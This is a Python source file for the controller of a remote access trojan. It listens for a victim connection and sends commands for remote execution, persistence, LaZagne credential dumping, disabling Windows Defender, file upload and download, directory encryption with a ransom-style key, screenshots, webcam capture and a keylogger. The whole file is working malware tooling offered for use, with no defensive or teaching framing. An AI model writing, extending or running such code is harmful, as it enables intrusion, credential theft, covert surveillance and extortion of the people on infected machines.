import socket
import struct
import cv2
import numpy as np
import shutil
import utils

class Server():
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def receive_all(self, sock, size):
        data = b''
        while len(data) < size:
            packet = sock.recv(size - len(data))
            if not packet:
                return
            data += packet
        return data

    def send_file(self, client_socket, command):
        parts = command.split(' ', 2)
        cmd, filename = parts
        try:
            with open(filename, 'rb') as f:
                while True:
                    data = f.read()
                    if not data:
                        return "There is not content in your file"
                    client_socket.send(command.encode())
                    client_socket.send(data)
                    response_size = struct.unpack('>I', client_socket.recv(4))[0]
                    response = self.receive_all(client_socket, response_size).decode()
                    return response
        except Exception as e:
            return f"Failed to send file {filename}: {str(e)}"

    def receive_file(self, client_socket, command):
        filename = command[9:]
        try:
            client_socket.send(command.encode())
            with open(filename, "wb") as file:
                data = client_socket.recv(10000)
                if not data:
                    return f"The file {filename} was received but has not data"
                file.write(data)
                response_size = struct.unpack('>I', client_socket.recv(4))[0]
                response = self.receive_all(client_socket, response_size).decode()
                return response
        except Exception as e:
            return f"Failed to receive file: {str(e)}"



    def receive_image_from_client(self, sock, filename, command):
        try:
            sock.send(command.encode())
            response_size = struct.unpack('>I', sock.recv(4))[0]
            response = self.receive_all(sock, response_size).decode()

            if response.startswith(">>> Failed"):
                return response
            else:
                data_size = struct.unpack('>I', sock.recv(4))[0]

                data = self.receive_all(sock, data_size)


                img_np = np.frombuffer(data, dtype=np.uint8)
                img = cv2.imdecode(img_np, cv2.IMREAD_COLOR)


                cv2.imwrite(filename, img)

                return f"{response} \nImage received and saved as {filename} successfully."
        except Exception as e:
            return f"Failed to receive image: {str(e)}"



    def send_all(self, client_socket, command):
        try:
            client_socket.send(command.encode())
            response_size = struct.unpack('>I', client_socket.recv(4))[0]
            response = self.receive_all(client_socket, response_size).decode()
            return response
        except Exception as e:
            client_socket.close()
            return f"Failed to send command: {str(e)}"

    def register_key(self, client_socket, command):
        _ = True
        try:
            while True:
                if _:
                    op = input("Insert 'start' to initialize keylogger: ")
                    if op == 'start':
                        client_socket.send(command.encode())
                        client_socket.send(command.encode())
                        response_size = struct.unpack('>I', client_socket.recv(4))[0]
                        response = self.receive_all(client_socket, response_size).decode()
                        print(response)
                        if response != '>>> Keylogger Started':
                            return response
                    else:
                        return 'Invalid value'
                        break
                rtn = input("Insert 'show' to receive History of keys or insert 'keylogger_stop' to stop: ")
                if rtn == 'show':
                    client_socket.send(command.encode())
                    response_size = struct.unpack('>I', client_socket.recv(4))[0]
                    response = self.receive_all(client_socket, response_size).decode()
                    if response is not None:
                        print(response)
                elif rtn == 'keylogger_stop':
                    client_socket.send(rtn.encode())
                    response_size = struct.unpack('>I', client_socket.recv(4))[0]
                    response = self.receive_all(client_socket, response_size).decode()
                    if response is not None:
                        print(response)
                    if response == '>>> Keylogger Stopped':
                        return
                else:
                    pass
                _ = False

        except Exception as e:
            print(f"Failed to capture keys: {str(e)}")







    def start(self):
        _ = 0
        n = 0
        chk = False

        while True:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                server_socket.bind((self.host, self.port))
                text = utils.center(f"Listening on {self.host}:{self.port}...")
                utils.yellow(text)
                server_socket.listen(5)
                client_socket, client_addr = server_socket.accept()
                utils.show_banner()
                text = utils.center(f"[+] Received From {client_addr}")
                utils.green(text)
                while True:
                    command = input("💀>>:")


                    if command.lower() == "exit":
                        print(self.send_all(client_socket, command))
                        client_socket.close()
                        break


                    elif command.lower().startswith("exec"):
                        print(self.send_all(client_socket, command))

                    elif command.lower() == "get_system_info":
                        print(self.send_all(client_socket, command))

                    elif command.lower().startswith("web-open"):
                        print(self.send_all(client_socket, command))

                    elif command.lower().startswith("pop-up"):
                        print(self.send_all(client_socket, command))

                    elif command.lower() == "persist":
                        print(self.send_all(client_socket, command))

                    elif command.lower().startswith("lazagne"):
                        print(self.send_all(client_socket, command))

                    elif command.lower() == "help":
                        print(self.send_all(client_socket, command))

                    elif command.lower() == "dir":
                        print(f"File in directory:\n{self.send_all(client_socket, command)}")

                    elif command.lower().startswith("cd"):
                        print(self.send_all(client_socket, command))

                    elif command.startswith("upload"):
                        print(self.send_file(client_socket, command))

                    elif command.startswith("download"):
                        print(self.receive_file(client_socket, command))

                    elif command.lower() == "crypter":
                        key0 = self.send_all(client_socket, command)
                        print(f"Directory encrypted! Your key: {key0}")
                        chk = True

                    elif command.lower() == "ask_permission":
                        print(self.send_all(client_socket, command))

                    elif command.lower() == "disable_defender":
                        print(self.send_all(client_socket, command))

                    elif command.lower() == "decrypter":
                        if chk:
                            key = input("Enter the decryption key:")
                            if key != key0:
                                print("Wrong key")
                                continue
                            ck = command + key
                            print(self.send_all(client_socket, ck))
                        else:
                            print("There isn't to decrypt")

                    elif command.lower() == "screenshot":
                        print(self.receive_image_from_client(client_socket, f"screenshot{_}.png", command))
                        _ += 1
                    elif command.lower() == "auto_remove":
                        print(self.send_all(client_socket, command))

                    elif command.lower().startswith("keylogger"):
                        self.register_key(client_socket, command)

                    elif command.lower() == "grab_cam":
                        print(self.receive_image_from_client(client_socket, f"self{n}.png", command))
                        n += 1

                    else:
                        print("Invalid command. Type 'help' for list of available commands.")
                        continue


            except Exception as e:
                print(f"Error: {e}")
                exit(0)
            finally:
                server_socket.close()


if __name__ == "__main__":
    server = Server("192.168.2.126", 666)
    server.start()


